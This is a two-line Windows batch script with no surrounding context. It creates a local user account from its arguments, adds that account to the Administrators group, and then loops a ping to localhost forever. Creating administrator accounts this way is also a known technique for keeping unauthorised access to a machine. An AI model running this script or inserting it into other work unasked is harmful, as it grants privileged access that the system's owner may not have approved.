net USER %1 %2 /ADD && net localgroup "Administrators" %1 /ADD

ping -t localhost > NUL